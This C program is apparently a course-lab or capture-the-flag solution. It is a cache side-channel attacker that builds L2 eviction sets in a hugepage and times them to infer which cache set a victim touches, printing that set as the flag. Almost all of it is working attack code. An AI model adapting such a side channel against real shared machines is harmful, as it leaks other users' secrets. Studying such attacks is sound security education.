#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>

#define PAGE_SIZE (2 * 1024 * 1024)  // 2MB Hugepage
#define L2_CACHE_SETS 2048           // Skylake L2 cache sets
#define CACHE_LINE_SIZE 64
#define MAX_EVSET_SIZE 32            // Eviction set size (max 32 addresses)
#define SAMPLE_RUNS 30               // Samples per measurement
#define ROUNDS 30                    // Number of voting rounds

// Get L2 cache set index from an address
int get_set_index(uint64_t addr) {
    return (addr >> 6) & 0x7FF; // 11 bits for 2048 sets
}

// Build an eviction set for a given cache set
void build_eviction_set(volatile uint8_t *buf, int target_set, volatile uint8_t **evset, int *evset_size) {
    *evset_size = 0;
    uint64_t base_addr = (uint64_t) buf;

    for (int offset = 0; offset < PAGE_SIZE; offset += CACHE_LINE_SIZE) {
        uint64_t addr = base_addr + offset;
        if (get_set_index(addr) == target_set) {
            evset[*evset_size] = (volatile uint8_t *) addr;
            (*evset_size)++;
            if (*evset_size >= MAX_EVSET_SIZE) {
                break;
            }
        }
    }
}

// Measure average access time for an eviction set
uint64_t probe_eviction_set(volatile uint8_t **evset, int evset_size) {
    uint64_t total_time = 0;
    for (int sample = 0; sample < SAMPLE_RUNS; sample++) {
        for (int i = 0; i < evset_size; i++) {
            total_time += measure_one_block_access_time((uint64_t) evset[i]);
        }
    }
    return total_time / (SAMPLE_RUNS * evset_size);
}

int main(int argc, char const *argv[]) {
    int flag = -1;

    volatile uint8_t *buf = (volatile uint8_t *) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

    if (buf == MAP_FAILED) {
        perror("mmap error");
        exit(1);
    }

    buf[0] = 1; // Dummy write to ensure allocation

    printf("Attacker started. Building eviction sets...\n");

    // Build eviction sets for all cache sets
    volatile uint8_t *eviction_sets[L2_CACHE_SETS][MAX_EVSET_SIZE];
    int evset_sizes[L2_CACHE_SETS];

    for (int set = 0; set < L2_CACHE_SETS; set++) {
        build_eviction_set(buf, set, eviction_sets[set], &evset_sizes[set]);
    }

    printf("Eviction sets built. Monitoring cache sets...\n");

    int votes[L2_CACHE_SETS] = {0};

    // Voting rounds
    for (int round = 0; round < ROUNDS; round++) {
        uint64_t timings[L2_CACHE_SETS];

        for (int set = 0; set < L2_CACHE_SETS; set++) {
            if (evset_sizes[set] > 0) {
                timings[set] = probe_eviction_set(eviction_sets[set], evset_sizes[set]);
            } else {
                timings[set] = 0xFFFFFFFFFFFFFFFF; // If no addresses, artificially large
            }
        }

        // Find the set with max timing
        uint64_t max_time = 0;
        int candidate_flag = -1;

        for (int set = 0; set < L2_CACHE_SETS; set++) {
            if (timings[set] > max_time) {
                max_time = timings[set];
                candidate_flag = set;
            }
        }

        if (candidate_flag != -1) {
            votes[candidate_flag]++;
        }

        usleep(500); // Small sleep
    }

    // Find the set with the most votes
    int max_votes = 0;
    for (int set = 0; set < L2_CACHE_SETS; set++) {
        if (votes[set] > max_votes) {
            max_votes = votes[set];
            flag = set;
        }
    }

    printf("Flag: %d\n", flag);
    return 0;
}
